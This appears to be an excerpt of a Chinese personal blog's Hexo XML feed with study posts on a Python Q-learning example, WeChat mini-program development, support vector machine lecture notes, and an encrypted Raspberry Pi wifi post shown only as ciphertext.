\#frist_place &#x3D; input(&quot;请输入在那个地方:&quot;)  
\#while frist_place!&#x3D;5 :  
  
next_place &#x3D; int(input(&#39;初始房间号&#39;))  
list2 &#x3D; [next_place]  
while next_place !&#x3D; 5:  
next_place, value &#x3D; wan_find(Q1, next_place, list2)  
list2.append(next_place)  
print(list2)

运行结果为：

[[0. 0. 0. 0. 0.8 0. ]

[0. 0. 0. 0.64 0. 1. ]

[0. 0. 0. 0.64 0. 0. ]

[0. 0.8 0.512 0. 0.8 0. ]

[0.64 0. 0. 0.64 0. 1. ]

[0. 0.8 0. 0. 0.8 1. ]]

初始房间号2

[2, 3, 1, 5]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>matlab</tag>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序开发</title>
    <url>/2021/10/25/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h1><h2 id="微信小程序开发环境"><a href="#微信小程序开发环境" class="headerlink" title="微信小程序开发环境"></a>微信小程序开发环境</h2><ul>
<li>微信小程序参考文档：</li>
<li><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/devtools.html">开发教程</a><br><img src="https://res.wx.qq.com/wxdoc/dist/assets/img/main.0e6611d0.png" alt=""></li>
<li><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">开发环境下载</a></li>
</ul>
<h2 id="文件介绍"><a href="#文件介绍" class="headerlink" title="文件介绍"></a>文件介绍</h2><p>主要由两个部分组成和html不同的是</p>
<p>微信小程序四层结构</p>
<p>分别为：</p>
<ul>
<li>.js 逻辑</li>
<li>.json 布局</li>
<li>.wxml 内容</li>
<li>.wxss 主题</li>
</ul>
<h2 id="app-json文件"><a href="#app-json文件" class="headerlink" title="app.json文件"></a>app.json文件</h2><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>[1] 设置页面顺序</p>
<p>[2] 创建页面</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>[1] 设置页面的主题</p>
<p>[2] 页面颜色</p>
<p>[3] 页面名字</p>
<p>[4] 是否可以下拉，下拉背景色</p>
<h3 id="tabBar"><a href="#tabBar" class="headerlink" title="tabBar"></a>tabBar</h3><p>[1] 设置下选项框的主题</p>
<p>[2] 通过选择不同的tabBar选择不同的页面</p>
<p>W[3] 设置选项框颜色</p>
<h3 id="参考模板"><a href="#参考模板" class="headerlink" title="参考模板"></a>参考模板</h3><pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;pages&quot;: [
        &quot;pages&#x2F;demo01&#x2F;demo01&quot;,
        &quot;pages&#x2F;index&#x2F;index&quot;,
        &quot;pages&#x2F;logs&#x2F;logs&quot;    

    ],

    &quot;window&quot;: &#123;
        &quot;backgroundTextStyle&quot;: &quot;dark&quot;,
        &quot;navigationBarBackgroundColor&quot;: &quot;#0094ff&quot;,
        &quot;navigationBarTitleText&quot;: &quot;恋爱助手&quot;,
        &quot;navigationBarTextStyle&quot;: &quot;white&quot;,
        &quot;enablePullDownRefresh&quot;:true,
        &quot;backgroundColor&quot;:&quot;#0094ff&quot;
    &#125;,
    &quot;tabBar&quot;: &#123;
        &quot;list&quot;: [
        &#123;
            &quot;pagePath&quot;: &quot;pages&#x2F;index&#x2F;index&quot;,
            &quot;text&quot;: &quot;我要投递&quot;,
            &quot;iconPath&quot;: &quot;icon&#x2F;bbox.png&quot;,
            &quot;selectedIconPath&quot;: &quot;icon&#x2F;gbox.png&quot;
            
        &#125;,
        &#123;
            &quot;pagePath&quot;: &quot;pages&#x2F;demo01&#x2F;demo01&quot;,
            &quot;text&quot;: &quot;我要标签&quot;,
            &quot;iconPath&quot;: &quot;icon&#x2F;bbox.png&quot;,
            &quot;selectedIconPath&quot;: &quot;icon&#x2F;gbox.png&quot;
        &#125;
        ],
        &quot;color&quot;:&quot;#0094ff&quot;,
        &quot;selectedColor&quot;: &quot;#ff9400&quot;,
        &quot;position&quot;: &quot;bottom&quot;
    &#125;,
    &quot;style&quot;: &quot;v2&quot;,
    &quot;sitemapLocation&quot;: &quot;sitemap.json&quot;
&#125;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="参考模板-1"><a href="#参考模板-1" class="headerlink" title="参考模板"></a>参考模板</h3><pre class="line-numbers language-none"><code class="language-none">Page(&#123;

  &#x2F;**
   * 页面的初始数据
   *&#x2F;
  data: &#123;
    massage:&quot;hello world&quot;,
    num:1000,
    Isgirl:true,
    person:&#123;
        age:23,
        hight:180,
        weight:150,
        name:&quot;kunpeng&quot;

    &#125;,
    list:[
        &#123;
            id : 0,
            name:&#39;girl&#39;
        &#125;,
        &#123;
            id : 1,
            name:&#39;boy&#39;
        &#125;
    ]


  &#125;,

&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="wxml"><a href="#wxml" class="headerlink" title="wxml"></a>wxml</h2><h3 id="设置页面的显示内容，类似xml"><a href="#设置页面的显示内容，类似xml" class="headerlink" title="设置页面的显示内容，类似xml"></a>设置页面的显示内容，类似xml</h3><ol>
<li>text不换行，view换行</li>
<li>标签属性使用</li>
<li>bool类型充当属性 checked属性 字符串和花括号之间不要存在空格</li>
</ol>
<h3 id="运算-》表达式"><a href="#运算-》表达式" class="headerlink" title="运算 ==》表达式"></a>运算 ==》表达式</h3><ol>
<li>在花括号加入表达式</li>
<li>表达式 简单的运算<ol>
<li>数字的加减</li>
<li>字符串的拼接</li>
<li>三元表达式</li>
</ol>
</li>
<li>语句<ol>
<li>复杂的代码段</li>
<li>if else</li>
<li>switch</li>
<li>do while</li>
<li>for </li>
</ol>
</li>
</ol>
<h3 id="列表循环"><a href="#列表循环" class="headerlink" title="列表循环"></a>列表循环</h3><ol>
<li>wx:for=”“ wx:for-item=”循环项名称” wx:for-index=”循环项索引”</li>
<li>wx:key=”唯一的值”用于提高列表渲染性能<ol>
<li>wx:key 绑定一个普通的字符串的时候 这个字符串的名称肯定是选好数组中的对象的唯一属性</li>
<li>wx:key = “<em>this” 就表示你的数组是一个普通数组 </em>this 表示是循环项<br>[1,2,3,44,5]<br>[“1”,”222”,”adfdf”]</li>
<li>当出现数组嵌套循环的时候，注意绑定的名称不要重名<br> wx:for-item=”循环项名称” wx:for-index=”循环项索引”</li>
<li>默认情况下不写代码<br> wx:for-item=”循环项名称” wx:for-index=”循环项索引”<br> 小程序也会把 循环和索引设置为item和index<br> 只有一层循环可以直接写 wx:for=”“<h3 id="对象循环"><a href="#对象循环" class="headerlink" title="对象循环"></a>对象循环</h3></li>
</ol>
</li>
<li>wx:for=”“ wx:for-item=”对象名称” wx:for-index=”对象索引”</li>
</ol>
<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><ol>
<li>占位的标签</li>
<li>写代码的时候 可以看到这个标签存在</li>
<li>页面渲染 小程序会把它移除掉</li>
</ol>
<h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><ol>
<li><view wx:if="true">隐藏</view></li>
<li><p>if嵌套条件</p>
<p> wx if</p>
<p> wx elif</p>
<p> wx else</p>
</li>
<li><p>hidden<br> 1.hidden          </p>
<p> 标签频繁切换用hidden，不频繁选择if     </p>
<h3 id="参考模板-2"><a href="#参考模板-2" class="headerlink" title="参考模板"></a>参考模板</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!--pages&#x2F;demo01&#x2F;demo01.wxml--&gt;
&lt;!--1.text不换行，view换行 --&gt;
&lt;view&gt;&#123;&#123;massage&#125;&#125;&lt;&#x2F;view&gt;
&lt;view&gt;&#123;&#123;num&#125;&#125;&lt;&#x2F;view&gt;
&lt;view&gt;是否为男人&#123;&#123;Isgirl&#125;&#125;&lt;&#x2F;view&gt;
&lt;view&gt;&#123;&#123;person.age&#125;&#125;&lt;&#x2F;view&gt;

&lt;!--2.标签属性使用 --&gt;
&lt;view data-num&#x3D;&quot;&#123;&#123;num&#125;&#125;&quot;&gt;自定义&lt;&#x2F;view&gt;

&lt;!--3. bool类型充当属性 checked属性
    字符串和花括号之间不要存在空格
--&gt;
&lt;view&gt;
&lt;checkbox checked&#x3D;&quot;&#123;&#123;Isgirl&#125;&#125;&quot;&gt;&lt;&#x2F;checkbox&gt;
&lt;&#x2F;view&gt;

&lt;!-- 
    7 运算 &#x3D;&#x3D;》表达式
     1. 在花括号加入表达式
     2. 表达式 简单的运算
        1. 数字的加减
        2. 字符串的拼接
        3. 三元表达式
     3. 语句
        1.复杂的代码段
            1. if else
            2. switch
            3. do while
            4. for 
 --&gt;
 &lt;view&gt;&#123;&#123;1+1&#125;&#125;&lt;&#x2F;view&gt;
 &lt;view&gt;&#123;&#123;&#39;1&#39;+&#39;1&#39;&#125;&#125;&lt;&#x2F;view&gt;
 &lt;view&gt;&#123;&#123;10%2&#x3D;&#x3D;0 ? &#39;偶数&#39; : &#39;奇怪数&#39;&#125;&#125;&lt;&#x2F;view&gt;

 
 &lt;!-- 
8. 列表循环 
    1. wx:for&#x3D;&quot;&#123;&#123;数组或对象&#125;&#125;&quot; wx:for-item&#x3D;&quot;循环项名称&quot; wx:for-index&#x3D;&quot;循环项索引&quot;
    2. wx:key&#x3D;&quot;唯一的值&quot;用于提高列表渲染性能
        1. wx:key 绑定一个普通的字符串的时候 这个字符串的名称肯定是选好数组中的对象的唯一属性
        2. wx:key &#x3D; &quot;*this&quot; 就表示你的数组是一个普通数组 *this 表示是循环项
        [1,2,3,44,5]
        [&quot;1&quot;,&quot;222&quot;,&quot;adfdf&quot;]
        3. 当出现数组嵌套循环的时候，注意绑定的名称不要重名
            wx:for-item&#x3D;&quot;循环项名称&quot; wx:for-index&#x3D;&quot;循环项索引&quot;
        4. 默认情况下不写代码
            wx:for-item&#x3D;&quot;循环项名称&quot; wx:for-index&#x3D;&quot;循环项索引&quot;
            小程序也会把 循环和索引设置为item和index
            只有一层循环可以直接写 wx:for&#x3D;&quot;&#123;&#123;数组或对象&#125;&#125;&quot;
     --&gt;
     &lt;view&gt;
        &lt;view
        wx:for&#x3D;&quot;&#123;&#123;list&#125;&#125;&quot; 
        wx:for-item&#x3D;&quot;item&quot; 
        wx:for-index&#x3D;&quot;index&quot;
        wx:key&#x3D;&quot;id&quot;
        &gt;
        索引：&#123;&#123;index&#125;&#125;
        --
        数值：&#123;&#123;item.name&#125;&#125;
        &lt;&#x2F;view&gt;
     &lt;&#x2F;view&gt;
     &lt;view&gt;
        &lt;view
        wx:for&#x3D;&quot;&#123;&#123;list&#125;&#125;&quot; 
        wx:key&#x3D;&quot;id&quot;
        &gt;
        索引：&#123;&#123;index&#125;&#125;
        --
        数值：&#123;&#123;item.name&#125;&#125;
        &lt;&#x2F;view&gt;
     &lt;&#x2F;view&gt;

 &lt;!--
     对象循环
    1. wx:for&#x3D;&quot;&#123;&#123;对象&#125;&#125;&quot; wx:for-item&#x3D;&quot;对象名称&quot; wx:for-index&#x3D;&quot;对象索引&quot; 
    --&gt;
    &lt;view&gt;
        &lt;view&gt;对象循环&lt;&#x2F;view&gt;
        &lt;view wx:for&#x3D;&quot;&#123;&#123;person&#125;&#125;&quot;
        wx:for-item&#x3D;&quot;value&quot; 
        wx:for-index&#x3D;&quot;key&quot;
        wx:key&#x3D;&quot;age&quot;
        &gt;
        属性:&#123;&#123;key&#125;&#125;
        --
        值:&#123;&#123;value&#125;&#125;
        &lt;&#x2F;view&gt;
    &lt;&#x2F;view&gt;

    
    &lt;!-- 10 block 
        1. 占位的标签
        2. 写代码的时候 可以看到这个标签存在
        3. 页面渲染 小程序会把它移除掉
    --&gt;
    &lt;view&gt;
        &lt;block
        wx:for&#x3D;&quot;&#123;&#123;list&#125;&#125;&quot; 
        wx:for-item&#x3D;&quot;item&quot; 
        wx:for-index&#x3D;&quot;index&quot;
        wx:key&#x3D;&quot;id&quot;
        class&#x3D;&quot;my_list&quot;
        &gt;
        索引：&#123;&#123;index&#125;&#125;
        --
        数值：&#123;&#123;item.name&#125;&#125;
        &lt;&#x2F;block&gt;
     &lt;&#x2F;view&gt;
&lt;!-- 条件渲染
        1. &lt;view wx:if&#x3D;&quot;&#123;&#123;true&#125;&#125;&quot;&gt;隐藏&lt;&#x2F;view&gt;
        2. if嵌套条件
            wx if
            wx elif
            wx else
        2. hidden
            1.hidden
 --&gt;
 &lt;view&gt;
    &lt;view&gt;条件渲染&lt;&#x2F;view&gt;
    &lt;view wx:if&#x3D;&quot;&#123;&#123;true&#125;&#125;&quot;&gt;隐藏&lt;&#x2F;view&gt;
    &lt;view wx:if&#x3D;&quot;&#123;&#123;flase&#125;&#125;&quot;&gt;隐藏&lt;&#x2F;view&gt;

    &lt;view wx:if&#x3D;&quot;&#123;&#123;flase&#125;&#125;&quot;&gt;1&lt;&#x2F;view&gt;
    &lt;view wx:elif&#x3D;&quot;&#123;&#123;flase&#125;&#125;&quot;&gt;2&lt;&#x2F;view&gt;
    &lt;view wx:else&gt;3&lt;&#x2F;view&gt;

    &lt;view&gt;-------------&lt;&#x2F;view&gt;
    &lt;view hidden&gt; hidden&lt;&#x2F;view&gt;
&lt;&#x2F;view&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习</title>
    <url>/2020/11/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a><center>机器学习</center></h1><span id="more"></span>
<h2 id="6-支持向量机"><a href="#6-支持向量机" class="headerlink" title="6 支持向量机"></a>6 支持向量机</h2><h3 id="6-1-间隔与支持向量"><a href="#6-1-间隔与支持向量" class="headerlink" title="6.1 间隔与支持向量"></a>6.1 间隔与支持向量</h3><ol>
<li>问题<br>给定训练样本 <script type="math/tex">D=\lbrace(x_1,y_1),(x_1,y_1),...,(x_m,y_m)\rbrace,y_i\in \lbrace{-1,+1}\rbrace</script>分类学习的关键就是基于训练集找出一个划分超平面，将不同类别的样本分开，而这种平面很多，如何选择最好的划分超平面？</li>
</ol>
<p><img src="https://www.codekp.cn/download/img/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E8%B6%85%E5%B9%B3%E9%9D%A2%E5%88%92%E5%88%86%E8%AE%AD%E7%BB%83%E9%9B%86.PNG" width = "681" height = "302" alt="图片名称" align=center /></p>
<center>
图6.1存在划分超平面将两个训练样本分开
</center>


<p>正中间那根具有更强的鲁棒性，对未示例的泛化能力更强，因此会获得更好的性能。<br>划分超平面可以通过如下线性方程来描述：</p>
<script type="math/tex; mode=display">w^Tx+b=0</script><p>其中<script type="math/tex">w=(w_1;w_2;...;w_d)</script>为法向量决定平面的方向，b为位移向项决定平面距离原点的距离。<br>其中任意一点到超平面的距离可写为</p>
<script type="math/tex; mode=display">
r = \frac{|w^Tx+b|}{||w||}</script><ol>
<li>支持向量<br>距离划分超平面最近的几个训练样本点。且这些点满足以下不等式。<br>$ w^Tx_i+b\geq+1,  y_i=+1 $<br>$w^Tx_i+b\leq-1,  y_i=+1$</li>
<li>间隔<br>两个异类支持向量到超平面的距离之和：<script type="math/tex; mode=display">r=\frac{2}{||w||}</script></li>
<li>最大间隔<br>对应的划分超平面 <script type="math/tex; mode=display">max(r=\frac{2}{||w||})  \\s.t. y_i(w^Tx_i+b)\geq1,i=1,2,...,m</script></li>
<li>最小间隔<br>支持向量机基本型<script type="math/tex; mode=display">min(r=\frac{2}{||w||}) \\s.t. y_i(w^Tx_i+b)\geq1,i=1,2,...,m</script></li>
</ol>
<h3 id="6-2-对偶问题"><a href="#6-2-对偶问题" class="headerlink" title="6.2 对偶问题"></a>6.2 对偶问题</h3><h4 id="6-2-1-对偶问题"><a href="#6-2-1-对偶问题" class="headerlink" title="6.2.1 对偶问题"></a>6.2.1 对偶问题</h4><p>  突二次规划问题</p>
<h4 id="6-2-2-对偶问题"><a href="#6-2-2-对偶问题" class="headerlink" title="6.2.2 对偶问题"></a>6.2.2 对偶问题</h4><ol>
<li>更有效求解参数w和b的方法:拉格朗日乘子法</li>
</ol>
<ul>
<li>对svm基本型式子的每个约束添加大于等于零的拉格朗日乘子，得到该问题的拉格朗日函数。<br>$ L(w,b,a)=\frac{1}{2}||w||^2+ \sum_{i=1}^ma_i(1-y_i(w^Tx_i+b)) $<ul>
<li>令L(w,b,a)对w和b求偏导为零。<br>$ w = \sum<em>{i=1}^{m}a_iy_ix_i$<br>$ 0=\sum</em>{i=1}^{m}a_iy_i$</li>
<li>将L(w,b,a)中的w和b消去，得到svm基本式子的对偶问题<br>${max}<em>{a}a_i-\frac{1}{2}\sum</em>{i=1}^m\sum<em>{j=1}^ma_ia_jy_iy_jx_i^Tx_j$<br>$s.t. \sum</em>{i=1}{m}a_iy_i=0,a_i\geq0,i=1,2,…,m$</li>
</ul>
</li>
</ul>
<ol>
<li>KKT条件<script type="math/tex; mode=display">f= \begin{cases} a_i\geq0;\\ y_if(x_i)-1\geq0\\ a_i(y_if(x_i)-1)=0 \end{cases}</script></li>
<li>如何求解对偶问题中的a？<ul>
<li>当二次规划问题求解<br>算法：二次规划算法<br>缺点：问题规模正比例于训练样本数，这样会在实际任务中造成很大开销。<br>算法：SMO算法<br>选取一对所需更新的变量$a_i和a_j$<br>固定$a_j和a_i$ 以外的参数，求解对偶问题获取新的$a_i和a_j$<br>不断执行上述两个步骤直到收敛</li>
</ul>
<ol>
<li>如何确定偏移项b？</li>
</ol>
<ul>
<li>使用支持向量机求解平均值<br>$b=\frac{1}{|s|}\sum<em>{s\in S}(y_s-a_iy_ix_i^Tx_s)$<br>$y_s(\sum</em>{i\in S}a_iy_ix_i^Tx_s+b)=1$<br>$\lbrace S={i=a_i&gt;0,i=1,2…,m}\rbrace$为所有向量机下标集<h4 id="6-2-2-支持向量机的一个重要性质"><a href="#6-2-2-支持向量机的一个重要性质" class="headerlink" title="6.2.2 支持向量机的一个重要性质"></a>6.2.2 支持向量机的一个重要性质</h4>训练结束后，大部分训练样本都不需要保留，最终模型与支持向量有关。<h3 id="6-3-核函数"><a href="#6-3-核函数" class="headerlink" title="6.3 核函数"></a>6.3 核函数</h3>对线性可分问题，可以将原始空间映射到一个更高维的特征空间，使得样本在这个特征空间内线性可分。<h4 id="6-3-1-令y表示x映射后的特征向量"><a href="#6-3-1-令y表示x映射后的特征向量" class="headerlink" title="6.3.1 令y表示x映射后的特征向量"></a>6.3.1 令y表示x映射后的特征向量</h4>对偶问题<h4 id="6-3-2-支持向量展示"><a href="#6-3-2-支持向量展示" class="headerlink" title="6.3.2 支持向量展示"></a>6.3.2 支持向量展示</h4>模型训练最优解可通过训练样本核函数展开。<h4 id="6-3-3-常用核函数"><a href="#6-3-3-常用核函数" class="headerlink" title="6.3.3 常用核函数"></a>6.3.3 常用核函数</h4></li>
<li>线性核函数</li>
<li>多项式核函数</li>
<li>高斯核函数</li>
<li>拉普拉斯核函数</li>
<li>sigmoid核函数<h4 id="6-3-4-核函数定理"><a href="#6-3-4-核函数定理" class="headerlink" title="6.3.4 核函数定理"></a>6.3.4 核函数定理</h4></li>
<li>核矩阵总是半正定的</li>
<li>只要一个堆成函数的核函数半正定，就可以被用于核函数</li>
<li>半正定矩阵必然有对应的映射</li>
<li>任何一个核函数都定义了一个希尔伯特空间<blockquote>
<p>注意：特征空间的好坏对支持向量机至关重要<br>“核函数选择”成为支持向量机最大变数</p>
<h3 id="6-4-软间隔和正则化"><a href="#6-4-软间隔和正则化" class="headerlink" title="6.4 软间隔和正则化"></a>6.4 软间隔和正则化</h3><h4 id="6-4-1-硬间隔"><a href="#6-4-1-硬间隔" class="headerlink" title="6.4.1 硬间隔"></a>6.4.1 硬间隔</h4><p>要求所有样本均满足约束，所有样本必须划分正确。</p>
<h4 id="6-4-2-软间隔"><a href="#6-4-2-软间隔" class="headerlink" title="6.4.2 软间隔"></a>6.4.2 软间隔</h4></blockquote>
</li>
</ul>
<ol>
<li>解决现实任务：很难确定合适的核函数使得训练到的样本在特征空间中线性可分，或者是否过拟合。</li>
<li>解决方法：允许部分样本可以出错。允许某些样本不满足约束<br>$y_i(w^Tx_i+b)\geq1$<br>不满足样本尽可能少。</li>
<li>新的目标函数<h4 id="6-4-3-正则化"><a href="#6-4-3-正则化" class="headerlink" title="6.4.3 正则化"></a>6.4.3 正则化</h4></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>信息论</tag>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派_命令行连接wifi</title>
    <url>/2021/06/28/%E6%A0%91%E8%8E%93%E6%B4%BE-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9E%E6%8E%A5wifi/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4e715f80f897530b0cad42515d34d49d2c91af69b2c9ed3b3156aee371454e16">6e80dc631eb4208a478324a9c949dcc2178e9710ce232b846f16d147be2fbaff761c7bc0ab5bf070e237845610c79f9f5d544a4c21805e7e5fdf5c2237de676e04cc0dc6c2ba6f8a356cb773c5571a96c5732ebe17489815210ad3e79cce8c2620c27002ea0e664992c1bbbffb938c50f5596751f5b9b956d7a8e9d44a3fc32f0a91d826c2e972cd6a0d82719b224f0ffeefdbd66f306474203efe0cc4c8e43b4103f7e4c0609dd51248d8ac180b231eff74a662a3fd8d73fbb5e7a61afa3737f3d56818ad2141fcf475b779d9a1f041aa2df045649d51c4d893ac0794f8d93e4df6a0e15c93ccb5b1002c4397ca1b8e49411e18e08210dc2e308886a40f394b3e1678267bb9d7abf42b4adac2bf404b18c0c7b94f2386c04aa5554c2f7509b34529781bb153679385e738f25ea17898a1a4129576d82d7f06fc92c6e73a9c62110236d596aac804eb9ba266ea0c6860529e232fc0a938255ba7bdabd04f4210ea766812de7093cfd28f8dd57548bc0f54054c9ff9f8afd5323e8bda9bfe5b6d59a69c21714f36db856fd8cf7f650e3f5e401d215b999b913c3577ea40930bd686f8d9540d2014517df8e9dc61dfbafa48aab1d3fedf0448294bf6d067727cf1f7f0fbf8d1e9ab5f93f7dc9e1e8cd6d690e7211011c894e0fcef0554b5764a4272dd11c0c612f409da2c716bc1e0e117ee5d6a3b6fcaec4f8ba43a20d24ce7fd1c2f171fe1709ae8dfb24aa22615ce8c7b1de459911b37d035543990972fe06cf88241d94059d67ab111ade010e1b2b8adac83a1a383911ee175d02eaec05b8e6ff44ac4932adadb5078d864a7cfe2ab5ac89c262d0caa07e70627af2f118f403d51c25847c4992c1a2f0b00280e2d9a17ad3b4e9c5be8ae6c1488f853f04f10ef8ccd16f68fc480bd16978d1407cfe27f836439400297ab2cb2bc0b62e88190e869cd273d8c0e31f4427af039eed3a61e9992b1fff2cd4cac66762f98578341e955c7a082dfb2c0c5d35c815d16805140d2cd9a22a543d5a620aececd000cc60382f2c0242534d4dcd2c44058e4fae7e71de3c3f4a09250bce9989d4f14442fc4581e526abe54370405b9955f809409b56070e730047ea6572ad26b2c40e6536bc37739010cfb5ba54453b898e759aca888783b6cc53a47fbbe4a5444c5768b5286e7f798aae532842f2351722ea7a03a9286f4d248849993b862a08f28fc28b8372e45cc910ba0df285c451f9ec55346482b8d9c7dc0b5cd7bf9a9b873996a9a924eb3dd61a8727ae68d0794505bd154c2ee92f0be5d7ea918b3f7dca9907606030dc667269abf38760d9db102f1fea3b79b34a8c07a95a00ab0e3f1ecb4af38cb75bde07ca2bf3f7d36a7eb9ae360f7627b419612da852f773b040332db74261ff350bf912dd5a76a72244ffef6dd01721379d6ea91b35486ee9bb3def5efa93687cb5cf04594d843fc3fbfdccc546c1c57b48a8983b039f4769534cae41b9f8be2946335d7babe3917541eb764e2c87cabbcb5985339d36fce34640c3cec0a6f3baeaef01ae91bd4850505247585333c891ede559f617295ecbfa370dd9b1a35268b6309e093cf16b226b37cb61b600f015ba6480a214f2ef1d1ec659296da8bad035e81ca418b1a2926768f7db11447f8936c33d0a399205f98fc8c1e71f0a868794bcb38315715e5dd29fd98742d1cab951349ed430cb9162e3e677bb02e19d136da4f5c237e9745e80adaa3c3e93d932d10a2d723a16670f027e301abb3d160c38e1d92ca112d202f15e02395ab0b5ffe805bc54406c071fca64f90823dce2024af30c602b5e8870ef4de55bc125ed053eab80d78af6221341c9c7578249a0779881483763e2d576148dce64632e882bab28cd7d9fb7afad5e2704a0b91f6c4bb38de74124cf82c11aac59d1341c069866b45aa63007f203161db12ca6713d9b8dd4ee9f3758eaed617ca06b81b2f0aad9a9f8e29c0f8c730120881ce936ab2b5f64819cdef31c9a24272a81706cae0d10e8cf87d8c3022392e8bba01f2280ded8e0f7d62323f18ee1e316e54f7e899e4cd989baa40401d401c8d01c682474ba5bbea179c17ec49d591269024fe8352b1ea55ecdbd0abf4b98d35779aad697bf0f9f870dca75e5039ef71558eea815a125594c49437b091660578cdabc9fd135c9a1716e570af3700ec3993bc8e91d3d4203d0d6ed0009c7bba5491ab8cceb9ec252635dd06641fee583d19af8762f8ca676bc55fa1c4c7b2a01dc2197b74e27bdeaac82da8a8f84ddcb364f6fba52064b8d48f09a9cb592c9a4361c562be314c66ef172c2119c1837ff5442bfb202da7bc55868e6e1e66931d02251f40956e5ce1e5a4d54e15a089e23c27f2f45f7dc556dff0ddaf645ecce4ca88b79b41fa72c3e5c8e4596083c00ebacab49a42fafc1399d6f2d169c9c13e4ff22844c8ea3b93f3ceecf06e31ddac56c4b4112bb58d93205ede0fe365be3b80178554f93c721e1655825b3671c5b813e2085b4167728c8ef7144d537c8c86844270befa082b219f431cb226c65b9a5bc0a7cb2e8502a8f5ff72a623062f078a2c4b10af00e5bf093687d0c4ef90cd142b3af51699ad9a2ad6b00aba9c152ee8cca55642daa92befc4f45be7626751fdb098c4790d598a47dfed7c5ec89576a0c2796df99f837de21af48b42b6bf508e37c54cde2e9522beca0988a7b1a5fcd5fdcb5a510273cdf5b0de868ad3c35724352d03e0ee1149fdca7cba29a8c5ecaec2b9d8ed1e7727eedf601e7a0bdba81657ce60a867db2deb716904c15ad6a8ceeb32ea668bada11f6f6abdea72804289ecc2e661a77f8bd59a05cbb251a2f7c302331d834c622ab8410e5ac5320a40d3806cfc8f50dab8392aefe431bc380ae2a1766f489042ba71dac0695dcda101a7414a4a0ea06b074ea6c7e8478ca2fedcc29dbf9dafd81309359077f0501e6d946a1d55c67c7699310299b053e12faec7b9d8267b24d2eee051d681c431b9edd4f139eb37acd6b804ab5fe3512b078a9fcf19a26b09d61cbd6eabab21f4f88017f8469acaf8e4c9264d34736040ce5c408ded5c0b61c